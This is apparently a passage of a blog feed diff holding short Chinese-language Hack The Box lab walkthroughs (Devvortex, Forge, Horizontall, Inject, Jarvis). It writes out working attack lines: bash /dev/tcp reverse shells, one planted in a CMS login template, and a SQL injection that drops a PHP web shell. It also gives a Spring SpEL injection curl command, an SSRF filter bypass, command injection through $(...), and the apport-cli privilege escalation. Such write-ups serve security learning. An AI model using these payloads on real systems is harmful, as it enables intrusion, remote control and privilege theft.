+&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgba(0, 0, 0, 0.85);&#34;&gt;/api/index.php/v1/config/application?public=true&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgba(0, 0, 0, 0.85);&#34;&gt;访问该目录可以拿到泄露信息&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;lewis&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;P4ntherg0t1n5r3c0n##&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;登录cms账号密码&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;在&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:#000000;background-color:#FBDE28;&#34;&gt;System&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:#000000;background-color:#FBDE28;&#34;&gt;-&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:#000000;background-color:#FBDE28;&#34;&gt;&amp;gt;Templates&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:#000000;background-color:#FBDE28;&#34;&gt;-&amp;gt;&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:#000000;background-color:#FBDE28;&#34;&gt;Administrator Templates-&amp;gt;login.php&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:#000000;&#34;&gt;中增加反弹shell代码链接&lt;/font&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:#000000;&#34;&gt;exec(&amp;quot;/bin/bash -c &amp;lsquo;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.29/4444 0&amp;gt;&amp;amp;1&amp;rsquo;&amp;quot;);&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/devvortex/1724076094646-60fa9662-62de-4d02-b16a-046c669b9958.png&#34;
+	width=&#34;2539&#34;
+	height=&#34;1482&#34;
+	srcset=&#34;https://example.com/htb/devvortex/1724076094646-60fa9662-62de-4d02-b16a-046c669b9958_hu9447522740c9464f4f9a24e0b877085a_268791_480x0_resize_box_3.png 480w, https://example.com/htb/devvortex/1724076094646-60fa9662-62de-4d02-b16a-046c669b9958_hu9447522740c9464f4f9a24e0b877085a_268791_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;171&#34;
+		data-flex-basis=&#34;411px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;成功连接&lt;/p&gt;
+&lt;h1 id=&#34;2提权&#34;&gt;2提权
+&lt;/h1&gt;&lt;h2 id=&#34;从www-data-logan&#34;&gt;从www-data-&amp;gt;logan
+&lt;/h2&gt;&lt;p&gt;流程是连接mysql数据库拿到密码通过ssh登录logan(但不知道为什么我一直不成功)&lt;/p&gt;
+&lt;h2 id=&#34;从logan-root&#34;&gt;从logan-&amp;gt;root
+&lt;/h2&gt;&lt;p&gt;查看当前用户可以用那些root权限文件sudo -l&lt;/p&gt;
+&lt;p&gt;有一个/usr/bin/apport-cli文件，查看apport-cli版本有无历史漏洞，发现有&lt;/p&gt;
+&lt;h1 id=&#34;font-stylecolorrgb230-237-243background-colorrgb13-17-23cve-2023-1326font&#34;&gt;&lt;font style=&#34;color:rgb(230, 237, 243);background-color:rgb(13, 17, 23);&#34;&gt;CVE-2023-1326&lt;/font&gt;
+&lt;/h1&gt;&lt;p&gt;version&amp;lt;2.26&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;运行了 apport-cli 并设置了 -f 或 — file-bug 标志。创建报告后，选择&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;选项 v &lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;以查看报告最后，输入 &lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;！/bin/bash &lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;以 root 身份放入升级到升级的 bash 脚本中&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/devvortex/1724079317139-4e1ff575-f314-4b3f-a823-4e7550505420.png&#34;
+	width=&#34;2539&#34;
+	height=&#34;1482&#34;
+	srcset=&#34;https://example.com/htb/devvortex/1724079317139-4e1ff575-f314-4b3f-a823-4e7550505420_huafffe0fa0df9622d7f8df4a35ec1d99f_1149056_480x0_resize_box_3.png 480w, https://example.com/htb/devvortex/1724079317139-4e1ff575-f314-4b3f-a823-4e7550505420_huafffe0fa0df9622d7f8df4a35ec1d99f_1149056_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;171&#34;
+		data-flex-basis=&#34;411px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Forge</title>
+        <link>https://example.com/htb/forge/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/forge/</guid>
+        <description>&lt;h1 id=&#34;外网打点&#34;&gt;外网打点
+&lt;/h1&gt;&lt;p&gt;扫端口，有域名扫子域名，扫目录&lt;/p&gt;
+&lt;p&gt;打开网址&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/forge/1741503924490-3e975224-41fb-4eb1-9628-4956bf9874f9.png&#34;
+	width=&#34;1385&#34;
+	height=&#34;569&#34;
+	srcset=&#34;https://example.com/htb/forge/1741503924490-3e975224-41fb-4eb1-9628-4956bf9874f9_hu721f6959780cbe24106b6af0d6090377_50441_480x0_resize_box_3.png 480w, https://example.com/htb/forge/1741503924490-3e975224-41fb-4eb1-9628-4956bf9874f9_hu721f6959780cbe24106b6af0d6090377_50441_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;243&#34;
+		data-flex-basis=&#34;584px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;界面可以上传网址然后通过curl拿到网址的信息&lt;/p&gt;
+&lt;p&gt;有个后台域名admin.forge.htb&lt;/p&gt;
+&lt;p&gt;后台域名限制了本地ip访问（常规绕过也不管用）&lt;/p&gt;
+&lt;p&gt;所以思路就是制造ssrf攻击&lt;/p&gt;
+&lt;p&gt;测试admin.forge.htb&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/forge/1741504543864-81e80a16-662e-4ab8-9cd6-6900c6b3d821.png&#34;
+	width=&#34;1945&#34;
+	height=&#34;774&#34;
+	srcset=&#34;https://example.com/htb/forge/1741504543864-81e80a16-662e-4ab8-9cd6-6900c6b3d821_hue21aab5665cd3eae5e8ede098c92f430_69562_480x0_resize_box_3.png 480w, https://example.com/htb/forge/1741504543864-81e80a16-662e-4ab8-9cd6-6900c6b3d821_hue21aab5665cd3eae5e8ede098c92f430_69562_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;251&#34;
+		data-flex-basis=&#34;603px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;有黑名单&lt;/p&gt;
+&lt;p&gt;双大写绕过ADMIN.FORGE.htb&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/forge/1741504600184-be0efe05-1142-4768-9b48-a31a057900a6.png&#34;
+	width=&#34;1346&#34;
+	height=&#34;637&#34;
+	srcset=&#34;https://example.com/htb/forge/1741504600184-be0efe05-1142-4768-9b48-a31a057900a6_hueb68e24022327ed6793ad201ab54eab1_126334_480x0_resize_box_3.png 480w, https://example.com/htb/forge/1741504600184-be0efe05-1142-4768-9b48-a31a057900a6_hueb68e24022327ed6793ad201ab54eab1_126334_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;211&#34;
+		data-flex-basis=&#34;507px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/forge/1741504626869-d3ea1db1-52de-4a16-9788-72b3fda3db7d.png&#34;
+	width=&#34;1614&#34;
+	height=&#34;733&#34;
+	srcset=&#34;https://example.com/htb/forge/1741504626869-d3ea1db1-52de-4a16-9788-72b3fda3db7d_hu132737fc9601bf87c4e80fdc943aa01a_163304_480x0_resize_box_3.png 480w, https://example.com/htb/forge/1741504626869-d3ea1db1-52de-4a16-9788-72b3fda3db7d_hu132737fc9601bf87c4e80fdc943aa01a_163304_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;220&#34;
+		data-flex-basis=&#34;528px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;从这里得知upload可以用ftp协议&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://ADMIN.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@127.0.1.1/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://ADMIN.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@127.0.1.1/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/forge/1741504678038-84256762-192a-4ae9-85e9-ba03f01dde67.png&#34;
+	width=&#34;1135&#34;
+	height=&#34;369&#34;
+	srcset=&#34;https://example.com/htb/forge/1741504678038-84256762-192a-4ae9-85e9-ba03f01dde67_hu303086ca22064debaf08edd21fb7fa20_72124_480x0_resize_box_3.png 480w, https://example.com/htb/forge/1741504678038-84256762-192a-4ae9-85e9-ba03f01dde67_hu303086ca22064debaf08edd21fb7fa20_72124_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;307&#34;
+		data-flex-basis=&#34;738px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;有用，之后拿/.ssh/id_rsa&lt;/p&gt;
+&lt;p&gt;拿到user.txt&lt;/p&gt;
+&lt;h1 id=&#34;提权&#34;&gt;提权
+&lt;/h1&gt;&lt;p&gt;linpeas.sh扫pwnkit&lt;/p&gt;
+&lt;p&gt;上传脚本提权成功&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Horizontall</title>
+        <link>https://example.com/htb/horizontall/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/horizontall/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫描端口正常，打开网页添加域名，该域名下无任何发现，扫一下目录和子域名&lt;/p&gt;
+&lt;p&gt;扫到一个子域名api-prod打开是一个Strapi MCS框架的网页，在admin/init路径下发现具体版本，网上搜索poc反弹shell拿到立足点&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;上传linpeas扫，linpeas提示cve-2021-4034（Pwnkit）可以用&lt;/p&gt;
+&lt;p&gt;上传c语言脚本编写拿到shell&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Inject</title>
+        <link>https://example.com/htb/inject/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/inject/</guid>
+        <description>&lt;h1 id=&#34;立足点&#34;&gt;立足点
+&lt;/h1&gt;&lt;p&gt;curl -X POST  http://0.0.0.0:8080/functionRouter -H &amp;lsquo;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&amp;ldquo;touch /tmp/pwned&amp;rdquo;)&amp;rsquo; &amp;ndash;data-raw &amp;lsquo;data&amp;rsquo; -v&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;pspy64看系统进程&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;hosts: localhost&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;tasks:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;name: Checking webapp service&lt;/p&gt;
+&lt;p&gt;shell:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;     cmd: bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/YOUR_IP/4444 0&amp;gt;&amp;amp;1&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>Jarvis</title>
+        <link>https://example.com/htb/jarvis/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/jarvis/</guid>
+        <description>&lt;p&gt;要点：&lt;/p&gt;
+&lt;p&gt;在网页找到sql注入点&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/jarvis/1734009048604-0b790066-350a-427a-a1a8-d34e01a4c5c6.png&#34;
+	width=&#34;2513&#34;
+	height=&#34;1299&#34;
+	srcset=&#34;https://example.com/htb/jarvis/1734009048604-0b790066-350a-427a-a1a8-d34e01a4c5c6_hu7b795358a63967b8399196dc78f4c0cf_234744_480x0_resize_box_3.png 480w, https://example.com/htb/jarvis/1734009048604-0b790066-350a-427a-a1a8-d34e01a4c5c6_hu7b795358a63967b8399196dc78f4c0cf_234744_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;193&#34;
+		data-flex-basis=&#34;464px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/jarvis/1734009115952-4e365635-4b4e-449c-92b9-9d94ac50158c.png&#34;
+	width=&#34;2098&#34;
+	height=&#34;1355&#34;
+	srcset=&#34;https://example.com/htb/jarvis/1734009115952-4e365635-4b4e-449c-92b9-9d94ac50158c_hu82708d25ae5b634dc38de9898c4220d4_170273_480x0_resize_box_3.png 480w, https://example.com/htb/jarvis/1734009115952-4e365635-4b4e-449c-92b9-9d94ac50158c_hu82708d25ae5b634dc38de9898c4220d4_170273_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;154&#34;
+		data-flex-basis=&#34;371px&#34;
+	
+&gt;1 order by 8得知有7 列&lt;/p&gt;
+&lt;p&gt;http://10.10.10.143/room.php?cod=-1 union select 1,&amp;rsquo;&lt;?php system($_GET[1]); ?&gt;&amp;rsquo;,3,4,5,6,7 into outfile &amp;lsquo;/var/www/html/pwned.php&amp;rsquo;&lt;/p&gt;
+&lt;p&gt;权限提升&lt;/p&gt;
+&lt;p&gt;拿到www的shell&lt;/p&gt;
+&lt;p&gt;查看权限能用一个py文件#!/usr/bin/env python3&lt;br&gt;
+from datetime import datetime&lt;br&gt;
+import sys&lt;br&gt;
+import os&lt;br&gt;
+from os import listdir&lt;br&gt;
+import re&lt;/p&gt;
+&lt;p&gt;def show_help():&lt;br&gt;
+message=&amp;rsquo;&#39;&#39;&lt;/p&gt;
+&lt;hr&gt;
+&lt;ul&gt;
+&lt;li&gt;Simpler   -   A simple simplifier ;)                 *&lt;/li&gt;
+&lt;li&gt;Version 1.0                                          *&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;p&gt;Usage:  python3 simpler.py [options]&lt;/p&gt;
+&lt;p&gt;Options:&lt;br&gt;
+-h/&amp;ndash;help   : This help&lt;br&gt;
+-s          : Statistics&lt;br&gt;
+-l          : List the attackers IP&lt;br&gt;
+-p          : ping an attacker IP&lt;br&gt;
+&amp;rsquo;&amp;rsquo;&amp;rsquo;&lt;br&gt;
+print(message)&lt;/p&gt;
+&lt;p&gt;def show_header():&lt;br&gt;
+print(&amp;rsquo;&amp;rsquo;&amp;rsquo;***********************************************&lt;br&gt;
+_                 _&lt;br&gt;
+&lt;em&gt;&lt;em&gt;&lt;em&gt;&lt;em&gt;(__)&lt;/em&gt; __ ___  _ __ | | ___ _ __ _ __  _   _&lt;br&gt;
+&lt;strong&gt;/ &lt;strong&gt;| | &amp;lsquo;&lt;/strong&gt;  _ &lt;strong&gt;|&lt;/strong&gt; &amp;lsquo;&lt;/strong&gt; &lt;strong&gt;|&lt;/strong&gt; |/ _ \ &amp;lsquo;__| &amp;lsquo;&lt;/em&gt; | | | |&lt;br&gt;
+__ \ | | | | | | |&lt;/em&gt;) | |  &lt;em&gt;&lt;strong&gt;/ |&lt;/strong&gt; | |&lt;/em&gt;) | |&lt;/em&gt;| |&lt;br&gt;
+|&lt;em&gt;&lt;em&gt;&lt;em&gt;&lt;em&gt;/__|&lt;/em&gt;| |&lt;/em&gt;| |&lt;/em&gt;| .__/|&lt;/em&gt;|&lt;em&gt;&lt;strong&gt;|&lt;/strong&gt;&lt;/em&gt;&lt;strong&gt;(&lt;/strong&gt;&lt;em&gt;&lt;strong&gt;)| .&lt;/strong&gt;/ __, |&lt;br&gt;
+__                |&lt;/em&gt;|               |&lt;em&gt;|    |&lt;/em&gt;__/&lt;br&gt;
+@ironhackers.es&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&amp;lsquo;&amp;rsquo;&amp;rsquo;)&lt;/p&gt;
+&lt;p&gt;def show_statistics():&lt;br&gt;
+path = &amp;lsquo;/home/pepper/Web/Logs/&amp;rsquo;&lt;br&gt;
+print(&amp;lsquo;Statistics\n&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;&amp;rsquo;)&lt;br&gt;
+listed_files = listdir(path)&lt;br&gt;
+count = len(listed_files)&lt;br&gt;
+print(&amp;lsquo;Number of Attackers: &amp;rsquo; + str(count))&lt;br&gt;
+level_1 = 0&lt;br&gt;
+dat = datetime(1, 1, 1)&lt;br&gt;
+ip_list = []&lt;br&gt;
+reks = []&lt;br&gt;
+ip = &amp;rsquo;&amp;rsquo;&lt;br&gt;
+req = &amp;rsquo;&amp;rsquo;&lt;br&gt;
+rek = &amp;rsquo;&amp;rsquo;&lt;br&gt;
+for i in listed_files:&lt;br&gt;
+f = open(path + i, &amp;lsquo;r&amp;rsquo;)&lt;br&gt;
+lines = f.readlines()&lt;br&gt;
+level2, rek = get_max_level(lines)&lt;br&gt;
+fecha, requ = date_to_num(lines)&lt;br&gt;
+ip = i.split(&amp;rsquo;.&amp;rsquo;)[0] + &amp;lsquo;.&amp;rsquo; + i.split(&amp;rsquo;.&amp;rsquo;)[1] + &amp;lsquo;.&amp;rsquo; + i.split(&amp;rsquo;.&amp;rsquo;)[2] + &amp;lsquo;.&amp;rsquo; + i.split(&amp;rsquo;.&amp;rsquo;)[3]&lt;br&gt;
+if fecha &amp;gt; dat:&lt;br&gt;
+dat = fecha&lt;br&gt;
+req = requ&lt;br&gt;
+ip2 = i.split(&amp;rsquo;.&amp;rsquo;)[0] + &amp;lsquo;.&amp;rsquo; + i.split(&amp;rsquo;.&amp;rsquo;)[1] + &amp;lsquo;.&amp;rsquo; + i.split(&amp;rsquo;.&amp;rsquo;)[2] + &amp;lsquo;.&amp;rsquo; + i.split(&amp;rsquo;.&amp;rsquo;)[3]&lt;br&gt;
+if int(level2) &amp;gt; int(level_1):&lt;br&gt;
+level_1 = level2&lt;br&gt;
+ip_list = [ip]&lt;br&gt;
+reks=[rek]&lt;br&gt;
+elif int(level2) == int(level_1):&lt;br&gt;
+ip_list.append(ip)&lt;br&gt;
+reks.append(rek)&lt;br&gt;
+f.close()&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;print(&amp;#39;Most Risky:&amp;#39;)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;if len(ip_list) &amp;gt; 1:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    print(&amp;#39;More than 1 ip found&amp;#39;)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cont = 0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;for i in ip_list:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    print(&amp;#39;    &amp;#39; + i + &amp;#39; - Attack Level : &amp;#39; + level_1 + &amp;#39; Request: &amp;#39; + reks[cont])
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    cont = cont + 1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;print(&amp;#39;Most Recent: &amp;#39; + ip2 + &amp;#39; --&amp;gt; &amp;#39; + str(dat) + &amp;#39; &amp;#39; + req)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;def list_ip():&lt;br&gt;
+print(&amp;lsquo;Attackers\n&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;&amp;rsquo;)&lt;br&gt;
+path = &amp;lsquo;/home/pepper/Web/Logs/&amp;rsquo;&lt;br&gt;
+listed_files = listdir(path)&lt;br&gt;
+for i in listed_files:&lt;br&gt;
+f = open(path + i,&amp;lsquo;r&amp;rsquo;)&lt;br&gt;
+lines = f.readlines()&lt;br&gt;
+level,req = get_max_level(lines)&lt;br&gt;
+print(i.split(&amp;rsquo;.&amp;rsquo;)[0] + &amp;lsquo;.&amp;rsquo; + i.split(&amp;rsquo;.&amp;rsquo;)[1] + &amp;lsquo;.&amp;rsquo; + i.split(&amp;rsquo;.&amp;rsquo;)[2] + &amp;lsquo;.&amp;rsquo; + i.split(&amp;rsquo;.&amp;rsquo;)[3] + &amp;rsquo; - Attack Level : &amp;rsquo; + level)&lt;br&gt;
+f.close()&lt;/p&gt;
+&lt;p&gt;def date_to_num(lines):&lt;br&gt;
+dat = datetime(1,1,1)&lt;br&gt;
+ip = &amp;rsquo;&amp;rsquo;&lt;br&gt;
+req=&amp;rsquo;&amp;rsquo;&lt;br&gt;
+for i in lines:&lt;br&gt;
+if &amp;lsquo;Level&amp;rsquo; in i:&lt;br&gt;
+fecha=(i.split(&amp;rsquo; &amp;lsquo;)[6] + &amp;rsquo; &amp;rsquo; + i.split(&amp;rsquo; &amp;lsquo;)[7]).split(&amp;rsquo;\n&amp;rsquo;)[0]&lt;br&gt;
+regex = &amp;lsquo;(\d+)-(.&lt;em&gt;)-(\d+)(.&lt;/em&gt;)&amp;rsquo;&lt;br&gt;
+logEx=re.match(regex, fecha).groups()&lt;br&gt;
+mes = to_dict(logEx[1])&lt;br&gt;
+fecha = logEx[0] + &amp;lsquo;-&amp;rsquo; + mes + &amp;lsquo;-&amp;rsquo; + logEx[2] + &amp;rsquo; &amp;rsquo; + logEx[3]&lt;br&gt;
+fecha = datetime.strptime(fecha, &amp;lsquo;%Y-%m-%d %H:%M:%S&amp;rsquo;)&lt;br&gt;
+if fecha &amp;gt; dat:&lt;br&gt;
+dat = fecha&lt;br&gt;
+req = i.split(&amp;rsquo; &amp;lsquo;)[8] + &amp;rsquo; &amp;rsquo; + i.split(&amp;rsquo; &amp;lsquo;)[9] + &amp;rsquo; &amp;rsquo; + i.split(&amp;rsquo; &amp;lsquo;)[10]&lt;br&gt;
+return dat, req&lt;/p&gt;
+&lt;p&gt;def to_dict(name):&lt;br&gt;
+month_dict = {&amp;lsquo;Jan&amp;rsquo;:&amp;lsquo;01&amp;rsquo;,&amp;lsquo;Feb&amp;rsquo;:&amp;lsquo;02&amp;rsquo;,&amp;lsquo;Mar&amp;rsquo;:&amp;lsquo;03&amp;rsquo;,&amp;lsquo;Apr&amp;rsquo;:&amp;lsquo;04&amp;rsquo;, &amp;lsquo;May&amp;rsquo;:&amp;lsquo;05&amp;rsquo;, &amp;lsquo;Jun&amp;rsquo;:&amp;lsquo;06&amp;rsquo;,&amp;lsquo;Jul&amp;rsquo;:&amp;lsquo;07&amp;rsquo;,&amp;lsquo;Aug&amp;rsquo;:&amp;lsquo;08&amp;rsquo;,&amp;lsquo;Sep&amp;rsquo;:&amp;lsquo;09&amp;rsquo;,&amp;lsquo;Oct&amp;rsquo;:&amp;lsquo;10&amp;rsquo;,&amp;lsquo;Nov&amp;rsquo;:&amp;lsquo;11&amp;rsquo;,&amp;lsquo;Dec&amp;rsquo;:&amp;lsquo;12&amp;rsquo;}&lt;br&gt;
+return month_dict[name]&lt;/p&gt;
+&lt;p&gt;def get_max_level(lines):&lt;br&gt;
+level=0&lt;br&gt;
+for j in lines:&lt;br&gt;
+if &amp;lsquo;Level&amp;rsquo; in j:&lt;br&gt;
+if int(j.split(&amp;rsquo; &amp;lsquo;)[4]) &amp;gt; int(level):&lt;br&gt;
+level = j.split(&amp;rsquo; &amp;lsquo;)[4]&lt;br&gt;
+req=j.split(&amp;rsquo; &amp;lsquo;)[8] + &amp;rsquo; &amp;rsquo; + j.split(&amp;rsquo; &amp;lsquo;)[9] + &amp;rsquo; &amp;rsquo; + j.split(&amp;rsquo; &amp;lsquo;)[10]&lt;br&gt;
+return level, req&lt;/p&gt;
+&lt;p&gt;def exec_ping():&lt;br&gt;
+forbidden = [&amp;rsquo;&amp;amp;&amp;rsquo;, &amp;lsquo;;&amp;rsquo;, &amp;lsquo;-&amp;rsquo;, &amp;lsquo;&amp;rsquo;, &amp;lsquo;||&amp;rsquo;, &amp;lsquo;|&amp;rsquo;]&lt;br&gt;
+command = input(&amp;lsquo;Enter an IP: &amp;lsquo;)&lt;br&gt;
+for i in forbidden:&lt;br&gt;
+if i in command:&lt;br&gt;
+print(&amp;lsquo;Got you&amp;rsquo;)&lt;br&gt;
+exit()&lt;br&gt;
+os.system(&amp;lsquo;ping &amp;rsquo; + command)&lt;/p&gt;
+&lt;p&gt;if &lt;strong&gt;name&lt;/strong&gt; == &amp;lsquo;&lt;strong&gt;main&lt;/strong&gt;&amp;rsquo;:&lt;br&gt;
+show_header()&lt;br&gt;
+if len(sys.argv) != 2:&lt;br&gt;
+show_help()&lt;br&gt;
+exit()&lt;br&gt;
+if sys.argv[1] == &amp;lsquo;-h&amp;rsquo; or sys.argv[1] == &amp;lsquo;&amp;ndash;help&amp;rsquo;:&lt;br&gt;
+show_help()&lt;br&gt;
+exit()&lt;br&gt;
+elif sys.argv[1] == &amp;lsquo;-s&amp;rsquo;:&lt;br&gt;
+show_statistics()&lt;br&gt;
+exit()&lt;br&gt;
+elif sys.argv[1] == &amp;lsquo;-l&amp;rsquo;:&lt;br&gt;
+list_ip()&lt;br&gt;
+exit()&lt;br&gt;
+elif sys.argv[1] == &amp;lsquo;-p&amp;rsquo;:&lt;br&gt;
+exec_ping()&lt;br&gt;
+exit()&lt;br&gt;
+else:&lt;br&gt;
+show_help()&lt;br&gt;
+exit(）&lt;/p&gt;
+&lt;p&gt;要点是这里的-p选项 不输入ip&lt;/p&gt;
+&lt;p&gt;输入$(command)&lt;/p&gt;
+&lt;p&gt;将shell写入/tmp/shell.sh文件中&lt;/p&gt;
+&lt;p&gt;然后执行这个py文件&lt;/p&gt;
+&lt;p&gt;$(/tmp/shell.sh)&lt;/p&gt;
+&lt;p&gt;pepper到root&lt;/p&gt;
